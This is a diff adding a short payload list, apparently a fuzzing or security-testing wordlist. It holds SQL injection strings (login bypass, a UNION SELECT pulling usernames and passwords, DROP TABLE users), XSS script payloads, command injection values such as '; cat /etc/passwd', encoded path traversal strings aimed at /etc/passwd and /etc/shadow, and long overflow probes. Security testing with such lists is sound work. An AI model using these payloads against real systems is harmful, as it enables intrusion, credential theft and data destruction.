@@ -1,0 +1,28 @@
+' OR '1'='1' --
+" OR "1"="1" --
+' AND 1=1 -- 
+' OR '1'='1' LIMIT 1; --
+' UNION SELECT username, password FROM users --
+' OR 'x'='x' --
+' AND (SELECT COUNT(*) FROM tablename) > 0; --
+' AND SUBSTRING(@@version, 1, 1) = 5; --
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS');">
+<svg><script>alert('XSS')</script></svg>
+<iframe src="javascript:alert('XSS');"></iframe>
+'>
+"><img src=x onerror=alert('XSS')>
+<script>document.write(String.fromCharCode(88,83,83));</script>
+; EXEC master..xp_cmdshell 'ping 127.0.0.1' --
+; ls -la; --
+; DROP TABLE users; --
+; cat /etc/passwd; --
+../../../../etc/passwd
+../..//../etc/shadow
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252F..%252Fetc%252Fshadow
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+A x 129
+A x 257
+A x 513
+%70%61%73%73%77%64%0A
